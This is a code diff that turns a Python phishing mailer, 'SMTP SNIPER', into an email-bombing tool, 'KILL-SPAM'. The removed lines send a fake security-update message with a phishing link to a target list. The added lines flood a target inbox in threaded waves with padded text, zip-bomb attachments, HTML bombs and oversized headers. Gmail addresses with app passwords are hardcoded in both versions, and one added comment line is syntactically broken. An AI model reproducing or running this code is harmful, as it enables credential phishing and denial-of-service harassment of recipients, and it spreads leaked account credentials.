@@ -2,227 +2,331 @@
 import smtplib
 import time
 import random
+import string
 import os
+import threading
 from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import zipfile
+import io
 
 # ========== CONFIG ==========
 SENDERS = [
     {
         "email": "tskforcests@gmail.com",
-        "password": "zbdh eovg eosl ittv"
+        "password": "zbdh eovg eosl ittv",
+        "limit": 50,  # Reduced due to high volume
+        "sent": 0
     },
     {
         "email": "stsvxpmain@gmail.com",
-        "password": "wkhq qgxy kqau idyu"
+        "password": "wkhq qgxy kqau idyu",
+        "limit": 50,
+        "sent": 0
     }
 ]
 
-# PHISHING TEMPLATE
-SUBJECT = "IMPORTANT UPDATE"
-MESSAGE = """Dear User,
-
-A new security update is required for your account to maintain access.
-
-Please complete the verification process immediately:
-http://update-private-conn.vercel.app
-
-Failure to update within 24 hours may result in temporary account suspension.
-
-Best regards,
-Security Team"""
-
-DELAY_MIN = 15  # Reduced from 30
-DELAY_MAX = 45  # Reduced from 90
-
-TARGETS_FILE = "targz.txt"
-LOG_FILE = "sniper_log.txt"
+TARGET_EMAIL = "target@email.com"  # CHANGE TO TEST EMAIL YOU OWN
+SUBJECT_PREFIX = "Report"
 # ============================
 
-def load_targets():
-    """Load targets from file"""
-    if not os.path.exists(TARGETS_FILE):
-        print(f"[!] File not found: {TARGETS_FILE}")
-        print(f"[+] Creating sample file with test targets...")
-        with open(TARGETS_FILE, "w") as f:
-            for i in range(1, 11):
-                f.write(f"target{i}@example.com\n")
-        return [f"target{i}@example.com" for i in range(1, 11)]
-    
-    with open(TARGETS_FILE, "r") as f:
-        targets = [line.strip() for line in f if line.strip()]
-    
-    return targets
+# ATTACK MODES
+ATTACK_MODES = {
+    "TEXT_BOMB": 1,      # Large text content
+    "ZIP_BOMB": 2,       # Compressed recursion
+    "HTML_BOMB": 3,      HTML with resources
+    "MIXED": 4           # All of the above
+}
 
-def log_action(message):
-    """Log to file and print"""
+CURRENT_MODE = ATTACK_MODES["MIXED"]
+LOG_FILE = "killspam_log.txt"
+MAX_WORKERS = 5  # Conservative
+WAVE_SIZE = 10   # Smaller batches due to size
+
+def log(msg):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    log_entry = f"[{timestamp}] {message}"
+    entry = f"[{timestamp}] {msg}"
     
     with open(LOG_FILE, "a") as f:
-        f.write(log_entry + "\n")
+        f.write(entry + "\n")
     
-    print(log_entry)
-    return log_entry
+    print(entry)
 
-def send_email(sender_email, sender_password, target_email):
-    """Send one email"""
+def clear_terminal():
+    print("\033[H\033[J", end="")
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    print(f"[+] KILL-SPAM v1.0 | [{timestamp}]")
+    print("-" * 50)
+
+def get_active_sender():
+    for sender in SENDERS:
+        if sender["sent"] < sender["limit"]:
+            return sender
+    return None
+
+def generate_large_text(size_kb=100):
+    """Generate text payload (size in KB)"""
+    # Generate random text to avoid compression
+    chars = string.ascii_letters + string.digits + " " * 10
+    size = size_kb * 1024
+    
+    # Generate in chunks to avoid memory issues
+    chunk_size = 10000
+    result = []
+    while len(result) * chunk_size < size:
+        chunk = ''.join(random.choices(chars, k=min(chunk_size, size - len(result)*chunk_size)))
+        result.append(chunk)
+    
+    return ''.join(result)
+
+def create_zip_bomb():
+    """Create a small zip that extracts to large size"""
+    # Create in-memory zip with repeated content
+    zip_buffer = io.BytesIO()
+    
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        # Add same file multiple times with different names
+        large_content = "0" * 1000000  # 1MB of zeros (compresses well)
+        
+        for i in range(10):  # 10 files, each 1MB = 10MB extracted
+            zipf.writestr(f"file_{i}.txt", large_content)
+    
+    zip_buffer.seek(0)
+    return zip_buffer.getvalue()
+
+def create_html_bomb():
+    """Create HTML with many external resources"""
+    html_template = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Large Document</title>
+        <style>
+            body {{ margin: 0; padding: 0; }}
+            .block {{
+                width: 100%;
+                height: 1000px;
+                background: repeating-linear-gradient(
+                    45deg,
+                    #606dbc,
+                    #606dbc 10px,
+                    #465298 10px,
+                    #465298 20px
+                );
+            }}
+        </style>
+    </head>
+    <body>
+        <div id="content">
+    """
+    
+    # Add many divs with unique IDs
+    for i in range(1000):
+        html_template += f'<div class="block" id="block{i}">Section {i}</div>\n'
+    
+    html_template += """
+        </div>
+        <!-- External resources -->
+        <img src="https://via.placeholder.com/10000x10000/000000/FFFFFF?text=Large+Image" width="1" height="1">
+        <img src="https://via.placeholder.com/5000x5000/FF0000/FFFFFF?text=Red+Image" width="1" height="1">
+        <script>
+            // Generate more content dynamically
+            for(let i = 0; i < 100; i++) {
+                let div = document.createElement('div');
+                div.innerHTML = 'Dynamic content ' + i + ' '.repeat(1000);
+                document.getElementById('content').appendChild(div);
+            }
+        </script>
+    </body>
+    </html>
+    """
+    
+    return html_template
+
+def create_email_payload(sender_email, attack_id):
+    """Create email with attack payload"""
+    msg = MIMEMultipart('mixed')
+    msg['From'] = sender_email
+    msg['To'] = TARGET_EMAIL
+    msg['Subject'] = f"{SUBJECT_PREFIX} #{attack_id:04d}"
+    
+    # Always add text part
+    text_size = random.randint(50, 500)  # 50-500KB text
+    text_content = generate_large_text(text_size)
+    text_part = MIMEText(text_content, 'plain', 'utf-8')
+    msg.attach(text_part)
+    
+    # Add attack based on mode
+    mode_choice = random.choice(list(ATTACK_MODES.keys())) if CURRENT_MODE == ATTACK_MODES["MIXED"] else CURRENT_MODE
+    
+    if mode_choice == "HTML_BOMB" or CURRENT_MODE == ATTACK_MODES["HTML_BOMB"]:
+        html_content = create_html_bomb()
+        html_part = MIMEText(html_content, 'html', 'utf-8')
+        msg.attach(html_part)
+    
+    if mode_choice == "ZIP_BOMB" or CURRENT_MODE == ATTACK_MODES["ZIP_BOMB"]:
+        try:
+            zip_data = create_zip_bomb()
+            attachment = MIMEBase('application', 'zip')
+            attachment.set_payload(zip_data)
+            encoders.encode_base64(attachment)
+            attachment.add_header('Content-Disposition', 'attachment', filename=f'document_{attack_id}.zip')
+            msg.attach(attachment)
+        except Exception as e:
+            log(f"Zip creation failed: {e}")
+    
+    # Add extra headers to increase size
+    msg['X-Custom-Header'] = 'X' * 1000  # 1KB header
+    msg['X-Additional-Data'] = 'A' * 5000  # 5KB header
+    
+    return msg
+
+def send_heavy_email(sender_email, sender_password, attack_id):
+    """Send a heavy email"""
     try:
-        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
+        # Create heavy payload
+        msg = create_email_payload(sender_email, attack_id)
+        
+        # Calculate approximate size
+        email_size = len(msg.as_string()) / 1024  # Size in KB
+        log(f"Email #{attack_id}: {email_size:.1f}KB")
+        
+        # Send
+        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=30)
         server.starttls()
         server.login(sender_email, sender_password)
         
-        msg = f"Subject: {SUBJECT}\n\n{MESSAGE}"
-        server.sendmail(sender_email, target_email, msg)
+        # Send raw email (supports large emails better)
+        server.sendmail(sender_email, TARGET_EMAIL, msg.as_string())
         server.quit()
         
-        return True
+        return True, email_size
     except Exception as e:
-        log_action(f"[ERROR] Failed to {target_email}: {str(e)[:50]}")
-        return False
+        log(f"Failed #{attack_id}: {str(e)[:50]}")
+        return False, 0
+
+def execute_attack_wave(wave_num):
+    """Execute one wave of heavy emails"""
+    successful = 0
+    total_size = 0
+    wave_emails = 0
+    
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = []
+        
+        while wave_emails < WAVE_SIZE:
+            sender = get_active_sender()
+            if not sender:
+                break
+            
+            attack_id = sender["sent"] + 1
+            future = executor.submit(send_heavy_email, sender["email"], sender["password"], attack_id)
+            futures.append((future, sender))
+            wave_emails += 1
+            
+            # Small delay between starts
+            time.sleep(random.uniform(0.1, 0.5))
+        
+        # Collect results
+        for future, sender in futures:
+            success, size = future.result()
+            if success:
+                successful += 1
+                total_size += size
+                sender["sent"] += 1
+    
+    return successful, wave_emails, total_size
 
 def main():
-    print("\n" + "="*60)
-    print("[+] SMTP SNIPER - SECURITY UPDATE CAMPAIGN")
-    print("="*60)
+    clear_terminal()
     
-    # Load targets
-    targets = load_targets()
-    total_targets = len(targets)
+    print("[!] WARNING: This tool is for educational/testing purposes only.")
+    print("[!] Use only on email accounts you own and have permission to test.")
+    print("[!] Your Gmail accounts WILL be banned quickly with this tool.")
+    print("-" * 50)
     
-    print(f"[+] Targets loaded: {total_targets}")
-    print(f"[+] Senders ready: {len(SENDERS)}")
-    print(f"[+] Delay range: {DELAY_MIN}-{DELAY_MAX}s (FAST MODE)")
-    print(f"[+] Subject: {SUBJECT}")
-    print(f"[+] Link: http://update-private-conn.vercel.app")
-    print(f"[+] Log file: {LOG_FILE}")
-    print("="*60)
-    
-    if total_targets == 0:
-        print("[!] No targets found. Add emails to targz.txt")
+    confirm = input("[?] Type 'YES' to continue: ")
+    if confirm != "YES":
+        print("[!] Cancelled.")
         return
     
-    # Show warning
-    print("\n[⚠] CAMPAIGN DETAILS:")
-    print(f"   Subject: {SUBJECT}")
-    print(f"   Link: http://update-private-conn.vercel.app")
-    print(f"   Targets: {total_targets}")
-    print(f"   Estimated time: {(total_targets * (DELAY_MIN+DELAY_MAX)/2)/60:.1f} minutes")
+    total_sent = 0
+    total_successful = 0
+    total_data_sent = 0  # in KB
+    wave_count = 0
     
-    # Confirm start
-    confirm = input("\n[?] Type 'GO' to start: ").strip().upper()
-    if confirm != "GO":
-        print("[!] Cancelled")
-        return
+    # Reset counters
+    for sender in SENDERS:
+        sender["sent"] = 0
     
-    sent_count = 0
-    failed_count = 0
-    current_sender_index = 0
-    
-    start_time = datetime.now()
-    
-    print("\n" + "="*60)
-    print("[+] STARTING CAMPAIGN")
-    print("="*60)
-    
-    for i, target in enumerate(targets, 1):
-        # Get current sender (rotate)
-        sender = SENDERS[current_sender_index]
-        current_sender_index = (current_sender_index + 1) % len(SENDERS)
-        
-        # Send email
-        success = send_email(sender["email"], sender["password"], target)
-        
-        if success:
-            sent_count += 1
-            print(f"[✓] Email sent to ---> {target}")
-        else:
-            failed_count += 1
-        
-        # Progress update every 5 emails (more frequent)
-        if i % 5 == 0 or i == total_targets:
-            progress = (i / total_targets) * 100
-            elapsed = (datetime.now() - start_time).total_seconds()
-            emails_per_hour = (i / elapsed * 3600) if elapsed > 0 else 0
+    try:
+        while True:
+            wave_count += 1
             
-            print(f"[~] Progress: {i}/{total_targets} ({progress:.1f}%)")
-            print(f"[~] Success: {sent_count} | Failed: {failed_count}")
-            print(f"[~] Rate: {emails_per_hour:.1f} emails/hour")
-        
-        # Check if last target
-        if i < total_targets:
-            delay = random.randint(DELAY_MIN, DELAY_MAX)
+            # Check if any sender has capacity
+            if get_active_sender() is None:
+                log("All senders reached limit.")
+                break
             
-            # Show short countdown for small delays
-            if delay <= 30:
-                print(f"[⏱] Next in {delay}s", end="", flush=True)
-                for sec in range(delay, 0, -1):
-                    if sec % 10 == 0 or sec <= 5:
-                        print(f" {sec}", end="", flush=True)
-                    time.sleep(1)
-                print()
-            else:
-                mins = delay // 60
-                secs = delay % 60
-                if mins > 0:
-                    print(f"[⏱] Next in {mins}m {secs}s...")
-                else:
-                    print(f"[⏱] Next in {secs}s...")
-                time.sleep(delay)
+            # Display status
+            clear_terminal()
+            print(f"[+] KILL-SPAM v1.0 | Active")
+            print("-" * 50)
+            print(f"[∞] WAVE #{wave_count}")
+            print(f"[≠] Total Sent: {total_sent}")
+            print(f"[+] Successful: {total_successful}")
+            print(f"[≈] Data Sent: {total_data_sent/1024:.1f}MB")
+            print(f"[#] Accounts: {len(SENDERS)}")
+            print("-" * 30)
+            
+            for i, sender in enumerate(SENDERS, 1):
+                used = sender["sent"]
+                limit = sender["limit"]
+                print(f"[{i}] {sender['email'][:12]}...: {used}/{limit}")
+            
+            # Execute wave
+            wave_success, wave_total, wave_data = execute_attack_wave(wave_count)
+            
+            total_sent += wave_total
+            total_successful += wave_success
+            total_data_sent += wave_data
+            
+            log(f"Wave {wave_count}: {wave_success}/{wave_total} sent, {wave_data/1024:.1f}MB data")
+            
+            # Check completion
+            if get_active_sender() is None:
+                break
+            
+            # Longer cooldown due to heavy emails
+            cooldown = random.randint(60, 120)  # 1-2 minutes
+            log(f"Cooldown: {cooldown}s")
+            
+            for remaining in range(cooldown, 0, -1):
+                if remaining % 30 == 0 or remaining <= 10:
+                    print(f"Next wave in: {remaining}s", end="\r")
+                time.sleep(1)
+            print(" " * 30, end="\r")
     
-    # Final statistics
-    end_time = datetime.now()
-    total_duration = (end_time - start_time).total_seconds()
+    except KeyboardInterrupt:
+        log("Stopped by user")
     
-    print("\n" + "="*60)
-    print("[+] CAMPAIGN COMPLETE")
-    print("="*60)
-    print(f"[+] Total targets: {total_targets}")
-    print(f"[+] Successfully sent: {sent_count}")
-    print(f"[+] Failed: {failed_count}")
+    # Final report
+    clear_terminal()
+    print(f"[+] KILL-SPAM - COMPLETE")
+    print("-" * 50)
+    print(f"Waves executed: {wave_count}")
+    print(f"Total emails sent: {total_sent}")
+    print(f"Successful sends: {total_successful}")
+    print(f"Total data sent: {total_data_sent/1024:.1f}MB")
+    print(f"Success rate: {(total_successful/total_sent*100):.1f}%" if total_sent > 0 else "0%")
+    print("-" * 50)
     
-    if total_targets > 0:
-        success_rate = (sent_count/total_targets*100)
-        print(f"[+] Success rate: {success_rate:.1f}%")
-        print(f"[+] Total time: {total_duration:.0f}s ({total_duration/60:.1f} minutes)")
-        print(f"[+] Average per email: {total_duration/total_targets:.1f}s")
-        print(f"[+] Average speed: {total_targets/(total_duration/3600):.1f} emails/hour")
-    
-    print(f"[+] Log saved: {LOG_FILE}")
-    print("="*60)
-    
-    # Save final log
-    log_action(f"SECURITY UPDATE CAMPAIGN: {sent_count}/{total_targets} sent")
-    log_action(f"Link used: http://update-private-conn.vercel.app")
-
-def quick_setup():
-    """Create necessary files"""
-    if not os.path.exists(TARGETS_FILE):
-        print(f"[+] Creating {TARGETS_FILE}...")
-        with open(TARGETS_FILE, "w") as f:
-            sample_targets = [
-                "test1@example.com",
-                "test2@example.com",
-                "test3@example.com"
-            ]
-            for target in sample_targets:
-                f.write(target + "\n")
-        print(f"[+] Edit {TARGETS_FILE} with your actual targets")
-    
-    # Display current template
-    print("\n" + "="*60)
-    print("[+] EMAIL TEMPLATE LOADED:")
-    print("="*60)
-    print(f"SUBJECT: {SUBJECT}")
-    print("-"*60)
-    print(MESSAGE)
-    print("="*60)
-    
-    print(f"\n[+] Configuration ready")
-    print(f"[+] Add target emails to: {TARGETS_FILE}")
-    print(f"[+] Delays: {DELAY_MIN}-{DELAY_MAX}s (Fast mode)")
+    for i, sender in enumerate(SENDERS, 1):
+        print(f"Account {i}: {sender['sent']}/{sender['limit']}")
 
 if __name__ == "__main__":
-    quick_setup()
-    print("\n[+] Starting Security Update Campaign...")
-    time.sleep(3)
     main()
